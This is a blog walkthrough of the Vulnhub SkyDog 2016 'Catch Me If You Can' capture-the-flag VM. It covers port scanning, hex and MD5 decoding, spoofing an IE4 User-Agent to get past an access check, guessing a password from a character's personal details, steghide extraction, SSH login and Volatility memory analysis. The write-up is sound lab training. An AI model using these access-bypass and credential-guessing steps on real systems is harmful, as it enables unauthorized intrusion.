		<h2 class="entry-title"><a href="/vulnhub-skydog-2016-catch-me-if-you-can/" rel="bookmark">Vulnhub SkyDog 2016 &#8211; Catch Me If You Can</a></h2>		<div class="entry-meta">
			<span class="posted-on">Posted on <a href="/vulnhub-skydog-2016-catch-me-if-you-can/" rel="bookmark"><time class="entry-date published" datetime="2017-08-31T06:13:47+08:00">August 31, 2017</time></a></span> | <span class="byline"> by <span class="author vcard"><a class="url fn n" href="/author/anotsodev/">anotsodev</a></span></span> | <span class="comments-link"><i class="fa fa-comments" aria-hidden="true"></i> <a href="/vulnhub-skydog-2016-catch-me-if-you-can/#respond">Leave a Comment<span class="screen-reader-text"> on Vulnhub SkyDog 2016 &#8211; Catch Me If You Can</span></a></span>		</div>
<!-- .entry-meta -->
			</header><!-- .entry-header -->
	<div class="entry-content">
		<p>The&nbsp;SkyDogConCTF is one of the most enjoyable CTF challenges that I have ever played because it contained a lot of twists and challenges that don&#8217;t need advanced exploitation techniques and the tools to solve these challenges were available in Kali Linux.</p>
<p>There were also hints on how to get the flags.</p>
<p><em>Flag#1 &#8211; &#8220;Donâ€™t go Home Frank! Thereâ€™s a Hex on Your House&#8221;</em></p>
<p><em>Flag#2 &#8211; â€œObscurity or Security? That is the Question&#8221;</em></p>
<p><em>Flag#3 &#8211; â€œDuring his Travels Frank has Been Known to Intercept Traffic&#8221;</em></p>
<p><em>Flag#4 &#8211; â€œA Good Agent is Hard to Find&#8221;</em></p>
<p><em>Flag#5 &#8211; â€œThe Devil is in the Details &#8211; Or is it Dialogue? Either Way, if itâ€™s Simple, Guessable, or Personal it Goes Against Best Practices&#8221;</em></p>
<p><em>Flag#6 &#8211; â€œWhere in the World is Frank?&#8221;</em></p>
<p><em>Flag#7 &#8211; â€œFrank Was Caught on Camera Cashing Checks and Yelling &#8211; Iâ€™m The Fastest Man Alive!&#8221;</em></p>
<p><em>Flag#8 &#8211; â€œFranks Lost His Mind or Maybe itâ€™s His Memory. Heâ€™s Locked Himself Inside the Building. Find the Code to Unlock the Door Before He Gets Himself Killed!&#8221;</em></p>
<p>So after running the netdiscover command to get the IP address of the VM, I fired up Nmap to scan the available ports.</p>
<pre>nmap -p- -sV -sC -oA nmapscan 192.168.56.102
 Host is up (0.00048s latency).
 Not shown: 65531 filtered ports
 PORT STATE SERVICE VERSION
 22/tcp closed ssh
 80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: SkyDog Con CTF 2016 - Catch Me If You Can
 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: 400 Bad Request
 | ssl-cert: Subject: commonName=Network Solutions EV Server CA 2/organizationName=Network Solutions L.L.C./stateOrProvinceName=VA/countryName=US
 | Not valid before: 2016-09-21T14:51:57
 |_Not valid after: 2017-09-21T14:51:57
 |_ssl-date: TLS randomness does not represent time
 22222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 | 2048 b6:64:7c:d1:55:46:4e:50:e3:ba:cf:4c:1e:81:f9:db (RSA)
 |_ 256 ef:17:df:cc:db:2e:c5:24:e3:9e:25:16:3d:25:68:35 (ECDSA)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Aug 29 13:41:53 2017 -- 1 IP address (1 host up) scanned in 124.99 seconds</pre>
<p>There were three open ports:</p>
<ul>
<li>port 80</li>
<li>port 443</li>
<li>port 22222</li>
</ul>
<p>The first interesting port that I noticed was the port 22222, so I executed the ssh command.</p>
<pre>kaipowered@debian:~/Documents/Vulnhub/skydogctf$ ssh 192.168.56.102 -p 22222
 ###############################################################
 # WARNING #
 # FBI - Authorized access only! #
 # Disconnect IMMEDIATELY if you are not an authorized user!!! #
 # All actions Will be monitored and recorded #
 # Flag{53c82eba31f6d416f331de9162ebe997} #
 ###############################################################
 kaipowered@192.168.56.102's password:</pre>
<p>And there it was. The first flag was shown on the banner message. After getting the first flag, I cracked the given md5 hash here: http://md5online.org/</p>
<pre>Flag{53c82eba31f6d416f331de9162ebe997}

Decoded MD5 Hash: encrypt</pre>
<p>I had no idea on how can I use the word &#8216;encrypt&#8217; to get the next flag, so the next thing I did was open the web browser and open the website hosted on the VM.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-470" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-26-55.png?resize=1170%2C586&#038;ssl=1" alt="Screenshot from 2017-08-31 01-26-55" width="1170" height="586" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-26-55.png?w=1365&amp;ssl=1 1365w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-26-55.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-26-55.png?resize=1024%2C513&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-26-55.png?resize=768%2C385&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"></p>
<p>And it showed me the homepage of the SkyDogConCTF. I explored the entire website and I only found some interesting and funny testimonials of this CTF challenge.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-477" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-32-09.png?resize=814%2C516&#038;ssl=1" alt="Screenshot from 2017-08-31 01-32-09" width="814" height="516" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-32-09.png?w=814&amp;ssl=1 814w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-32-09.png?resize=300%2C190&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-32-09.png?resize=768%2C487&amp;ssl=1 768w" sizes="auto, (max-width: 814px) 100vw, 814px"></p>
<p>So after viewing all the links on the website, I went back to the homepage and view the page source of the website.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-482" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-34-10.png?resize=898%2C680&#038;ssl=1" alt="Screenshot from 2017-08-31 01-34-10" width="898" height="680" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-34-10.png?w=898&amp;ssl=1 898w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-34-10.png?resize=300%2C227&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-34-10.png?resize=768%2C582&amp;ssl=1 768w" sizes="auto, (max-width: 898px) 100vw, 898px"></p>
<p>And on line 40 of the source caught my attention. So I opened the source of the script on the web browser and it showed me this.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-487" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-36-17.png?resize=648%2C127&#038;ssl=1" alt="Screenshot from 2017-08-31 01-36-17" width="648" height="127" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-36-17.png?w=648&amp;ssl=1 648w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-36-17.png?resize=300%2C59&amp;ssl=1 300w" sizes="auto, (max-width: 648px) 100vw, 648px"></p>
<p>The first line of the JS file appeared that it was a hex, and the hint on the Flag #1 made sense quoting &#8220;Donâ€™t go Home Frank! Thereâ€™s a Hex on Your House&#8221;. So I went to this site http://www.rapidtables.com/convert/number/hex-to-ascii.htm and converted the hex value to ASCII and it showed me the first flag.</p>
<pre>flag{7c0132070a0ef71d542663e9dc1f5dee}

Decoded MD5 Hash: nmap</pre>
<p>I guessed that the decoded hash was a hint or something but I already ran Nmap scan so the next thing I did was visit the https version of the website and view the information of the certificate.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-509" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-45-36.png?resize=1170%2C634&#038;ssl=1" alt="Screenshot from 2017-08-31 01-45-36" width="1170" height="634" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-45-36.png?w=1366&amp;ssl=1 1366w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-45-36.png?resize=300%2C163&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-45-36.png?resize=1024%2C555&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-45-36.png?resize=768%2C416&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"></p>
<p>And there it was, the flag#3.</p>
<pre>flag3{f82366a9ddc064585d54e3f78bde3221}

Decoded MD5 Hash: personnel</pre>
<p>The next hint was &#8220;personnel&#8221; and my instinct tells me that it is a directory of the web server. And I was right.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-519" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-52-18.png?resize=1170%2C293&#038;ssl=1" alt="Screenshot from 2017-08-31 01-52-18" width="1170" height="293" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-52-18.png?w=1365&amp;ssl=1 1365w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-52-18.png?resize=300%2C75&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-52-18.png?resize=1024%2C257&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-01-52-18.png?resize=768%2C192&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"></p>
<p>So I checked again the hint for the next flag, which is the Flag #4 and it says that</p>
<pre>â€œA Good Agent is Hard to Find"</pre>
<p>And I can only think of one thing related to the word &#8220;Agent&#8221; and it was the &#8220;User-Agent&#8221;. But I had no idea what User-Agent should I use to open the &#8220;personnel&#8221; directory so after reading the &#8220;ACCESS DENIED!!! You Do Not Appear To Be Coming From An FBI Workstation. Preparing Interrogation Room 1. Car Batteries Charging&#8230;.&#8221; message, I opened again the html5.js file and searched for &#8220;FBI&#8221;. And there, I found two interesting lines in the JS file.</p>
<pre>/* maindev - 6/7/02 Adding temporary support for IE4 FBI Workstations */
 /* newmaindev - 5/22/16 Last maindev was and idoit and IE4 is still Gold image -@Support doug.perterson@fbi.gov */</pre>
<p>I searched for the User-Agent of the IE4 and changed my User-Agent to access the &#8220;personnel&#8221; directory.</p>
<pre>Mozilla/4.0 (compatible; MSIE 4.0; Windows 98)</pre>
<p>And I got an access to the &#8220;personnel&#8221; directory.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-542" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-10-57.png?resize=1170%2C591&#038;ssl=1" alt="Screenshot from 2017-08-31 02-10-57" width="1170" height="591" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-10-57.png?w=1351&amp;ssl=1 1351w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-10-57.png?resize=300%2C151&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-10-57.png?resize=1024%2C517&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-10-57.png?resize=768%2C388&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"></p>
<pre>flag{14e10d570047667f904261e6d08f520f}

Clue = new+flag

Decoded MD5 Hash: evidence

Clue = newevidence</pre>
<p>So I got the 4th flag and got the clue on how to get the next flag.</p>
<p>And it appeared that I needed to enter the username and password before I can view the content of the newevidence directory.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-552" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-12-54.png?resize=1170%2C583&#038;ssl=1" alt="Screenshot from 2017-08-31 02-12-54" width="1170" height="583" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-12-54.png?w=1351&amp;ssl=1 1351w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-12-54.png?resize=300%2C149&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-12-54.png?resize=1024%2C510&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-12-54.png?resize=768%2C383&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"></p>
<p>The first thing I did was to search &#8220;Agent Hanratty&#8221; on google to see any available information about Agent Hanratty that can be used as a username.</p>
<p>So I found that the first name of Agent Hanratty is Carl and the last name is Hanratty.</p>
<p>Going back to the html5.js file, I noticed that the format of the username was firstname.lastname.</p>
<pre>doug.perterson@fbi.gov</pre>
<p>So the username of Agent Hanratty is</p>
<pre>carl.hanratty</pre>
<p>I only needed the password to access the newevidence directory and based on the Flag #5 quote</p>
<p><em>The Devil is in the Details &#8211; Or is it Dialogue? Either Way, if itâ€™s Simple, Guessable, or <strong>Personal</strong> it Goes Against Best Practices</em></p>
<p>So I searched for the person that was very close or family member of Agent Hanratty and after searching and trying all the possible passwords, I tried the name &#8220;Grace&#8221; as the password that I found on this phrase.</p>
<p><em>Workaholic Carl Hanratty loses his daughter <strong>Grace</strong> to a divorce.</em></p>
<p>And I got an access to the newevidence directory.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-589" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-30-10.png?resize=1170%2C599&#038;ssl=1" alt="Screenshot from 2017-08-31 02-30-10" width="1170" height="599" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-30-10.png?w=1172&amp;ssl=1 1172w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-30-10.png?resize=300%2C154&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-30-10.png?resize=1024%2C524&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot-from-2017-08-31-02-30-10.png?resize=768%2C393&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"></p>
<p>So I downloaded the &#8220;Evidence Summary File&#8221; and the content of the file was this.</p>
<pre>flag{117c240d49f54096413dd64280399ea9}

Decoded MD5 Hash: panam</pre>
<p>It appeared that it was the Flag #5 and the decoded md5 hash was &#8220;panam&#8221;.</p>
<p>I tried opening &#8220;panam&#8221; on the web browser hoping that it was also a directory of the web server but there was no &#8220;panam&#8221; directory on the web server.</p>
<p>There were still two links on the page that I haven&#8217;t checked yet. So I clicked the &#8220;Possible Location&#8221; and there was an image file that can be downloaded, so I downloaded the image file.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" class="alignnone size-full wp-image-618" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot_from_2017_m2krw.jpg?resize=969%2C648&#038;ssl=1" alt="screenshot_from_2017_m2kRw" width="969" height="648" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot_from_2017_m2krw.jpg?w=969&amp;ssl=1 969w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot_from_2017_m2krw.jpg?resize=300%2C201&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/screenshot_from_2017_m2krw.jpg?resize=768%2C514&amp;ssl=1 768w" sizes="auto, (max-width: 969px) 100vw, 969px"></p>
<p>I tried to steghide the image to see if there were any secret messages embedded in the image file.</p>
<pre>kaipowered@debian:~/Documents/Vulnhub/skydogctf$ steghide --extract -sf image.jpg
 Enter passphrase: panam # I tried the passphrase panam that i got from the decoded md5 hash of flag #5
 the file "flag.txt" does already exist. overwrite ? (y/n) y
 wrote extracted data to "flag.txt"</pre>
<p>And I guess I was right and there was a text file named &#8220;flag&#8221;. I viewed the content of the text file and showed me this.</p>
<pre>kaipowered@debian:~/Documents/Vulnhub/skydogctf$ cat flag.txt
 flag{d1e5146b171928731385eb7ea38c37b8}
 =ILoveFrance

clue=iheartbrenda
 kaipowered@debian:~/Documents/Vulnhub/skydogctf$</pre>
<p>There was the flag #6, the decoded md5 hash, and a clue for the next flag. So going back to the hint for the next flag.</p>
<p><em>Flag#7 &#8211; â€œFrank Was Caught on Camera Cashing Checks and Yelling &#8211; Iâ€™m The Fastest Man Alive!&#8221;</em></p>
<p>The quote &#8220;I&#8217;m the Fastest Man Alive!&#8221; was sounded familiar so the next thing I did was google the quote and search who said that.</p>
<p><em>My name is Barry Allen, and I am the fastest man alive.</em></p>
<p>It seemed like Barry Allen from The Flash also said the &#8220;I&#8217;m the Fastest Man Alive!&#8221;.</p>
<p>The only last thing that was left to check was the ssh service on port 22222.</p>
<pre>username: barryallen

password: iheartbrenda</pre>
<p>With the found username and password, I used them&nbsp; and opened the ssh to login to the VM.</p>
<pre>kaipowered@debian:~/Documents/Vulnhub/skydogctf$ ssh barryallen@192.168.56.102 -p 22222
 ###############################################################
 # WARNING #
 # FBI - Authorized access only! #
 # Disconnect IMMEDIATELY if you are not an authorized user!!! #
 # All actions Will be monitored and recorded #
 # Flag{53c82eba31f6d416f331de9162ebe997} #
 ###############################################################
 barryallen@192.168.56.102's password:
 Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-38-generic x86_64)

* Documentation: https://help.ubuntu.com
 * Management: https://landscape.canonical.com
 * Support: https://ubuntu.com/advantage

14 packages can be updated.
 7 updates are security updates.

Last login: Tue Aug 29 07:19:16 2017 from 192.168.56.1

barryallen@skydogconctf2016:~$</pre>
<p>Commands</p>
<pre>barryallen@skydogconctf2016:~$ ls
 flag.txt security-system.data</pre>
<p>There were two files present in the user directory of barry allen.</p>
<ul>
<li>flag.txt</li>
<li>security-system.data</li>
</ul>
<p>The flag #7 and a zip file.</p>
<p>Here are the commands on how I got the Flag #8 and thanks to this walkthrough http://evilcsec.com/skydogcon-ctf-catch-me-if-you-can-walkthrough/ to get the final flag. I needed to see this walkthrough to get to know what tools to use to analyze the data file to get the final flag.</p>
<p>Hint for the final flag.</p>
<p>Flag#8 &#8211; â€œFranks Lost His Mind or Maybe itâ€™s His Memory. Heâ€™s Locked Himself Inside the Building. Find the Code to Unlock the Door Before He Gets Himself Killed!&#8221;</p>
<p>Commands</p>
<pre>barryallen@skydogconctf2016:~$ cat flag.txt
 flag{bd2f6a1d5242c962a05619c56fa47ba6} #decoded md5 hash: theflash
 barryallen@skydogconctf2016:~$

barryallen@skydogconctf2016:~$ file security-system.data
 security-system.data: Zip archive data, at least v2.0 to extract

barryallen@skydogconctf2016:~$ unzip security-system.data
 Archive: security-system.data
 replace security-system.data? [y]es, [n]o, [A]ll, [N]one, [r]ename: r
 new name: data
 inflating: data

barryallen@skydogconctf2016:~$ ls
 data flag.txt security-system.data</pre>
<h4>Copied the extracted file from barryallen to local machine</h4>
<pre>kaipowered@debian:~/Documents/Vulnhub/skydogctf$ scp -P 22222 barryallen@192.168.56.102:/home/barryallen/data ~/Documents/Vulnhub/skydogctf
 ###############################################################
 # WARNING #
 # FBI - Authorized access only! #
 # Disconnect IMMEDIATELY if you are not an authorized user!!! #
 # All actions Will be monitored and recorded #
 # Flag{53c82eba31f6d416f331de9162ebe997} #
 ###############################################################
 barryallen@192.168.56.102's password:
 data 100% 1024MB 40.1MB/s 00:25
 kaipowered@debian:~/Documents/Vulnhub/skydogctf$

kaipowered@debian:~/Documents/Vulnhub/skydogctf$ <strong>volatility imageinfo -f data</strong>
 Volatility Foundation Volatility Framework 2.6
 INFO : volatility.debug : Determining profile based on KDBG search...
 Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
 AS Layer1 : IA32PagedMemoryPae (Kernel AS)
 AS Layer2 : FileAddressSpace (/home/kaipowered/Documents/Vulnhub/skydogctf/tmp/data)
 PAE type : PAE
 DTB : 0x33e000L
 KDBG : 0x80545b60L
 Number of Processors : 1
 Image Type (Service Pack) : 3
 KPCR for CPU 0 : 0xffdff000L
 KUSER_SHARED_DATA : 0xffdf0000L
 Image date and time : 2016-10-10 22:00:50 UTC+0000
 Image local date and time : 2016-10-10 18:00:50 -0400

kaipowered@debian:~/Documents/Vulnhub/skydogctf$ <strong>volatility --profile=WinXPSP2x86 -f data filescan &gt; datafile</strong>
 Volatility Foundation Volatility Framework 2.6

kaipowered@debian:~/Documents/Vulnhub/skydogctf$ cat datafile | grep flag
 kaipowered@debian:~/Documents/Vulnhub/skydogctf$ cat datafile | grep txt
 0x0000000005e612f8 1 0 -W-r-- \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt
 0x000000000629fc08 1 0 R--rw- \Device\HarddiskVolume1\Program Files\VMware\VMware Tools\vmacthlp.txt
 0x00000000062c4620 1 0 R--rw- \Device\HarddiskVolume1\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\adobephotoshopcs3.txt
 0x00000000062c4be8 1 0 R--rw- \Device\HarddiskVolume1\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\adobeflashcs3.txt
 0x00000000062e04b0 1 0 R--r-d \Device\HarddiskVolume1\Documents and Settings\test\Recent\code.txt.lnk
 0x00000000063b4428 1 0 R--r-- \Device\HarddiskVolume1\System Volume Information\_restore{FA371F61-4781-4A7F-99F2-B979D68F9988}\drivetable.txt
 0x0000000006503e60 4 2 -W-rw- \Device\HarddiskVolume1\Documents and Settings\All Users\Application Data\VMware\VMware VGAuth\logfile.txt.0
 0x000000000663d4c0 1 0 R--rw- \Device\HarddiskVolume1\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\win7gadgets.txt
 0x000000000663d6b8 1 0 R--rw- \Device\HarddiskVolume1\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\vmwarefilters.txt
 0x000000000663d8b0 1 0 R--rw- \Device\HarddiskVolume1\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\visualstudio2005.txt
 0x000000000663daa8 1 0 R--rw- \Device\HarddiskVolume1\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\vistasidebar.txt
 0x000000000663dca0 1 0 R--rw- \Device\HarddiskVolume1\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\microsoftoffice.txt
 0x000000000663de98 1 0 R--rw- \Device\HarddiskVolume1\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\googledesktop.txt
 0x000000000663f970 1 0 R--rwd \Device\HarddiskVolume1\Documents and Settings\All Users\Application Data\VMware\VMware Tools\manifest.txt
 <strong>0x0000000006640bc8 1 0 R--rwd \Device\HarddiskVolume1\Documents and Settings\test\Desktop\code.txt</strong>

kaipowered@debian:~/Documents/Vulnhub/skydogctf$ <strong>volatility --profile=WinXPSP2x86 -f data cmdscan</strong>
 Volatility Foundation Volatility Framework 2.6
 **************************************************
 CommandProcess: csrss.exe Pid: 560
 CommandHistory: 0x10186f8 Application: cmd.exe Flags: Allocated, Reset
 CommandCount: 2 LastAdded: 1 LastDisplayed: 1
 FirstCommand: 0 CommandCountMax: 50
 ProcessHandle: 0x2d4
 Cmd #0 @ 0x1024400: cd Desktop
 Cmd #1 @ 0x4f2660: echo 66 6c 61 67 7b 38 34 31 64 64 33 64 62 32 39 62 30 66 62 62 64 38 39 63 37 62 35 62 65 37 36 38 63 64 63 38 31 7d &gt; code.txt
 kaipowered@debian:~/Documents/Vulnhub/skydogctf$</pre>
<p>Convert the hex to ascii.</p>
<p>http://www.rapidtables.com/convert/number/hex-to-ascii.htm</p>
<pre>66 6c 61 67 7b 38 34 31 64 64 33 64 62 32 39 62 30 66 62 62 64 38 39 63 37 62 35 62 65 37 36 38 63 64 63 38 31 7d</pre>
<p>Result: flag{841dd3db29b0fbbd89c7b5be768cdc81}</p>
<p>Decoded MD5 Hash: Two little mice</p>
<p>After I got the last flag and the decoded md5 hash, I googled the &#8220;Two little mice&#8221; and found the quote by Frank Abagnale Sr.</p>
<p><em><a href="https://www.imdb.com/name/nm0000686/?ref_=tt_trv_qu"><span class="character">Frank Abagnale Sr.</span></a>: Two little mice fell in a bucket of cream. The first mouse quickly gave up and drowned. The second mouse, wouldn&#8217;t quit. He struggled so hard that eventually he churned that cream into butter and crawled out. Gentlemen, as of this moment, I am that second mouse.</em></p>
<p>The quote of Frank made me goosebumps and I was really satisfied after I finished this CTF challenge. It was quite challenging and I really had fun!</p>


<hr class="wp-block-separator">



<p><strong>Subscribe for more!</strong></p>



<p>To stay up to date with my latest posts and more InfoSec guides, make sure to subscribe to this blog by entering your email address below.</p>


	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="174576423" data-post_access_level="everybody" data-subscriber_email="" id="subscribe-blog-8">
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label id="subscribe-field-8-label" for="subscribe-field-8" class="screen-reader-text">
								Type your emailâ€¦							</label>
							<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your emailâ€¦" value="" id="subscribe-field-8" title="Please fill in this field.">						</p>
												<p id="subscribe-submit">
							<input type="hidden" name="action" value="subscribe">
							<input type="hidden" name="blog_id" value="174576423">
							<input type="hidden" name="source" value="/?simply_static_page=1">
							<input type="hidden" name="sub-type" value="subscribe-block">
							<input type="hidden" name="app_source" value="">
							<input type="hidden" name="redirect_fragment" value="subscribe-blog-8">
							<input type="hidden" name="lang" value="en_US">
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="b537a8bb39"><input type="hidden" name="_wp_http_referer" value="/?simply_static_page=1"><input type="hidden" name="post_id" value="405">							<button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	


<p>I promise I won&#8217;t be spamming your mailbox. Because no one loves spam. AMIRIGHT?</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="768" height="576" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/more-spam.gif?resize=768%2C576&#038;ssl=1" alt="" class="wp-image-1602"></figure>
	</div>
<!-- .entry-content -->

	<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="/category/ctf/" rel="category tag">Capture The Flag</a>, <a href="/category/vulnhub/" rel="category tag">Vulnhub</a>, <a href="/category/writeups/" rel="category tag">Writeups</a></span> | <span class="tags-links">Tagged <a href="/tag/catchmeifyoucan/" rel="tag">catchmeifyoucan</a>, <a href="/tag/linux/" rel="tag">linux</a>, <a href="/tag/skydog/" rel="tag">skydog</a>, <a href="/tag/vulnhub/" rel="tag">vulnhub</a>, <a href="/tag/writeup/" rel="tag">writeup</a></span>	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

<article id="post-315" class="post-315 post type-post status-publish format-standard has-post-thumbnail hentry category-vulnhub category-writeups tag-ctf tag-linux tag-vulnhub tag-writeup no-featured-image-padding">
	<div class="post-thumbnail">
		<img width="1280" height="800" src="/wp-content/uploads/2017/08/troll-face.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/troll-face.jpg?w=1280&amp;ssl=1 1280w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/troll-face.jpg?resize=300%2C188&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/troll-face.jpg?resize=1024%2C640&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/08/troll-face.jpg?resize=768%2C480&amp;ssl=1 768w" sizes="auto, (max-width: 1280px) 100vw, 1280px">	</div>
	<header class="entry-header">
		<h2 class="entry-title"><a href="/vulnhub-tr0ll-1/" rel="bookmark">Vulnhub Tr0ll 1</a></h2>		<div class="entry-meta">
